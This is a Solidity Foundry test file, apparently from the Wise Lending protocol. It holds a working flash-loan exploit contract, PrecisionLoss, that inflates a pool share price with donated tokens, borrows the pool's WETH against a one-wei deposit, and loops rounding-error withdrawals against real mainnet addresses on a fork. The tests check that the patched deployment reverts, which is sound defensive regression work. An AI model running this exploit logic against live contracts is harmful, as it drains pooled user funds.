// SPDX-License-Identifier: -- WISE --

pragma solidity =0.8.24;

import "forge-std/Test.sol";
import "./InterfaceHub/IBalancerFlashloan.sol";
import "./InterfaceHub/IWiseLending.sol";
import "./InterfaceHub/ICurve.sol";
import "./InterfaceHub/IAaveHub.sol";
import "./InterfaceHub/IAave.sol";
import "./InterfaceHub/IPositionNFTs.sol";
import "./WiseLendingBaseDeployment.t.sol";

interface OldPositionNfts{
    function mintPosition() external;

    function walletOfOwner(
        address _owner
    )
        external
        view
        returns (uint256[] memory);
}

contract PrecisionLoss is IFlashLoanRecipient {

    address constant BALANCER_ADDRESS = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    uint256 ONE_WEI = 1;

    IWiseLending public WISE_LENDING;
    OldPositionNfts public POSITION_NFT;
    IAaveHub public AAVE_HUB;
    IBalancerVault public BALANCER_VAULT;

    uint256 loopAmount;
    bool isAavePool;

    address constant AAVE_WETH_ADDRESS = 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8;
    address constant WBTC_ADDRESS = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant WETH_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant CURVE_POOL_ADDRESS = 0xD51a44d3FaE010294C616388b506AcdA1bfAAE46;

    uint256 constant PRECISION_FACTOR_E8 = 10 ** 8;

    ICurve public CURVE;

    IAave public AAVE = IAave(
        0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2
    );

    constructor(
        address _positionNFts,
        address _wiseLending,
        address _aaveHub,
        uint256 _loopAmount,
        bool _isAavePool
    ) {
        POSITION_NFT = OldPositionNfts(
            _positionNFts
        );

        WISE_LENDING = IWiseLending(
            _wiseLending
        );

        AAVE_HUB = IAaveHub(
            _aaveHub
        );

        CURVE = ICurve(
            CURVE_POOL_ADDRESS
        );

        BALANCER_VAULT = IBalancerVault(
            BALANCER_ADDRESS
        );

        loopAmount = _loopAmount;
        isAavePool = _isAavePool;
    }

    function initiateFlashLoan(
        bool _new
    )
        external
    {
        IERC20[] memory tokenArray = new IERC20[](1);
        tokenArray[0] = IERC20(WBTC_ADDRESS);

        uint256[] memory amountArray = new uint256[](1);

        amountArray[0] = IERC20(WBTC_ADDRESS).balanceOf(
            BALANCER_ADDRESS
        );

        BALANCER_VAULT.flashLoan(
            this,
            tokenArray,
            amountArray,
            abi.encode(
                address(this),
                _new
            )
        );
    }

    event ERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes _data
    );

    function onERC721Received(
        address _operator,
        address _from,
        uint256 _tokenId,
        bytes memory _data
    )
        external
        returns (bytes4)
    {
        emit ERC721Received(
            _operator,
            _from,
            _tokenId,
            _data
        );

        return this.onERC721Received.selector;
    }

    function receiveFlashLoan(
        IERC20[] calldata _flashloanToken,
        uint256[] calldata _amounts,
        uint256[] calldata _feeAmounts,
        bytes calldata _userData
    )
        external
    {
        if (_userData.length < 0) {
            return;
        }

        if (_feeAmounts.length < 0) {
            return;
        }

        POSITION_NFT.mintPosition();
        console.log("minted");

        POSITION_NFT.mintPosition();
        console.log("minted2");

        uint256[] memory nftsOfOwner = POSITION_NFT.walletOfOwner(
            address(this)
        );

        uint256 nftIdFirst = nftsOfOwner[0];
        uint256 nftIdSecond = nftsOfOwner[1];

        // console.log(nftIdFirst, nftIdSecond, "NFT IDS");

        address flashToken = address(
            _flashloanToken[0]
        );

        (
            ,
            bool newWiseLending
        ) = abi.decode(
            _userData,
            (
                address,
                bool
            )
        );

        IERC20(flashToken).approve(
            address(AAVE_HUB),
            ONE_WEI
                + ONE_WEI
        );

        IERC20(flashToken).approve(
            address(WISE_LENDING),
            ONE_WEI + ONE_WEI
        );

        isAavePool
            ?  AAVE_HUB.depositExactAmount(
                nftIdFirst,
                flashToken,
                ONE_WEI
            )
            : WISE_LENDING.depositExactAmount(
                nftIdFirst,
                flashToken,
                ONE_WEI
            );

        isAavePool
            ? AAVE_HUB.depositExactAmount(
                nftIdSecond,
                flashToken,
                ONE_WEI
            )
            : WISE_LENDING.depositExactAmount(
                nftIdSecond,
                flashToken,
                ONE_WEI
            );

        // console.log("deposited klappt");
        // console.log(_amounts[0], "amounts");

        if (isAavePool) {

            IERC20(flashToken).approve(
                address(AAVE),
                _amounts[0]
            );

            AAVE.supply(
                flashToken,
                _amounts[0]
                    - ONE_WEI
                    - ONE_WEI,
                address(WISE_LENDING),
                0
            );

        } else {

            IERC20(flashToken).transfer(
                address(WISE_LENDING),
                _amounts[0]
                    - ONE_WEI
                    - ONE_WEI
            );
        }

        // console.log("transfer klappt");

        WISE_LENDING.syncManually(
            AAVE_WETH_ADDRESS
        );

        uint256 currentTotalPool = WISE_LENDING.getTotalPool(
            AAVE_WETH_ADDRESS
        );

        // console.log(currentTotalPool, "current total pool");
        // console.log("before borrow");

        WISE_LENDING.collateralizeDeposit(
            nftIdFirst,
            isAavePool
                ? AAVE_HUB.aaveTokenAddress(flashToken)
                : flashToken
        );

        if (newWiseLending == false) {
            WISE_LENDING.approve(
                address(AAVE_HUB),
                AAVE_WETH_ADDRESS,
                currentTotalPool
            );

            WISE_LENDING.approve(
                address(AAVE_HUB),
                AAVE_HUB.aaveTokenAddress(flashToken),
                currentTotalPool
            );
        }

        AAVE_HUB.borrowExactAmount(
            nftIdFirst,
            WETH_ADDRESS,
            currentTotalPool
        );

        console.log("after borrow ");

        IERC20(WETH_ADDRESS).approve(
            address(CURVE),
            currentTotalPool
        );

        (
            bool success,
        ) = address(CURVE).call(
            abi.encodeWithSignature(
                "exchange(uint256,uint256,uint256,uint256)",
                2, // WETH
                1, // WBTC
                currentTotalPool,
                0
            )
        );

        console.log(success, 'success');

        _loopWithdraws(
            flashToken,
            nftIdSecond,
            loopAmount
        );

        IERC20(flashToken).transfer(
            BALANCER_ADDRESS,
            _amounts[0]
        );

        console.log(
            IERC20(flashToken).balanceOf(
                address(this)
            ),
            "REST BALANCE"
        );
    }

    function _loopWithdraws(
        address _flashToken,
        uint256 _nftId,
        uint256 _count
    )
        internal
    {
        address usedToken = isAavePool
            ? AAVE_HUB.aaveTokenAddress(_flashToken)
            : _flashToken;

        for (uint256 i = 0; i < _count; i++) {

            uint256 calcAmount = _calculateThresholdAmount(
                WISE_LENDING.getTotalDepositShares(usedToken),
                WISE_LENDING.getPseudoTotalPool(usedToken)
            );

            /*
            console.log(calcAmount, "CALC AMOUNT");
            console.log(i,"i");

            console.log(
                WISE_LENDING.getTotalDepositShares(usedToken),
                "total deposit shares"
            );

            console.log(
                WISE_LENDING.getPseudoTotalPool(usedToken),
                "pseudo total pool"
            );
            */

            uint256 sharesWithdrawn = isAavePool
                ? AAVE_HUB.withdrawExactAmount(
                    _nftId,
                    _flashToken,
                    calcAmount
                )
                : WISE_LENDING.withdrawExactAmount(
                    _nftId,
                    _flashToken,
                    calcAmount
            );


            console.log(
                sharesWithdrawn,
                "shares withdrawn"
            );
        }
    }

    function _calculateThresholdAmount(
        uint256 _shares,
        uint256 _pseudo
    )
        internal
        pure
        returns (uint256)
    {
        return (_pseudo - 1) * PRECISION_FACTOR_E8
            / _shares
            / PRECISION_FACTOR_E8;
    }
}

contract TestPrecisionLoss is BaseDeploymentTest {

    uint256 constant OLD_BLOCK = 18314200;
    PrecisionLoss public PRECISION_LOSS_INSTANCE;

    function testPrecisionLossOld(
        bool _isAavePool
    )
        public
    {
        _useBlock(
            OLD_BLOCK
        );

        PRECISION_LOSS_INSTANCE = new PrecisionLoss(
            {
                _positionNFts: 0x9D6d4e2AfAB382ae9B52807a4B36A8d2Afc78b07,
                _wiseLending: 0x84524bAa1951247b3A2617A843e6eCe915Bb9674,
                _aaveHub: 0x4307d8207f2C429f0dCbd9051b5B1d638c3b7fbB,
                _loopAmount: 40,
                _isAavePool: _isAavePool
            }
        );

        PRECISION_LOSS_INSTANCE.initiateFlashLoan(
            {
                _new: false
            }
        );
    }


    function testPrecisionLossAll()
        public
    {
        uint256 snap = vm.snapshot();

        testPrecisionLossNew(
            {
                _isAavePool: true
            }
        );

        vm.revertTo(snap);

        testPrecisionLossNew(
            {
                _isAavePool: false
            }
        );

        vm.revertTo(
            snap
        );

        testPrecisionLossOld(
            {
                _isAavePool: true
            }
        );

        vm.revertTo(
            snap
        );

        testPrecisionLossOld(
            {
                _isAavePool: false
            }
        );
    }

    function testGas()
        public
    {
        _useBlock(
            NEW_BLOCK
        );

        _deployNewWiseLending(
            {
                _mainnetFork: true
            }
        );

        POSITION_NFTS_INSTANCE.mintPosition();

        uint256[] memory Ids = POSITION_NFTS_INSTANCE.walletOfOwner(
            WISE_DEPLOYER
        );

        uint256 nftIdUsed = Ids[
            Ids.length - 1
        ];

        _stopPrank();

        (
            bool success,
        ) = payable(WISE_DEPLOYER).call{
            value: 120 ether
        }("");

        if (success == false) {
            revert ();
        }

        _startPrank(
            WISE_DEPLOYER
        );

        LENDING_INSTANCE.depositExactAmountETH{
            value: 120 ether
        }(nftIdUsed);

        _stopPrank();
    }


    function testPrecisionLossNew(
        bool _isAavePool
    )
        public
    {
        _useBlock(
            NEW_BLOCK
        );

        _deployNewWiseLending(
            {
                _mainnetFork: true
            }
        );

        POSITION_NFTS_INSTANCE.mintPosition();

        uint256[] memory Ids = POSITION_NFTS_INSTANCE.walletOfOwner(
            WISE_DEPLOYER
        );

        uint256 nftIdUsed = Ids[Ids.length-1];

        _stopPrank();

        (
            bool success,
        ) = payable(WISE_DEPLOYER).call{
            value: 120 ether
        }("");

        console.log(success);

        _startPrank(
            WISE_DEPLOYER
        );

        AAVE_HUB_INSTANCE.depositExactAmountETH{
            value: 120 ether
        }(nftIdUsed);

        _stopPrank();

        PRECISION_LOSS_INSTANCE = new PrecisionLoss(
            {
                _positionNFts: address(POSITION_NFTS_INSTANCE),
                _wiseLending: address(LENDING_INSTANCE),
                _aaveHub: address(AAVE_HUB_INSTANCE),
                _loopAmount: 40,
                _isAavePool: _isAavePool
            }
        );

        vm.expectRevert(
            ValueIsZero.selector
        );

        PRECISION_LOSS_INSTANCE.initiateFlashLoan(
            {
                _new: true
            }
        );
    }

}
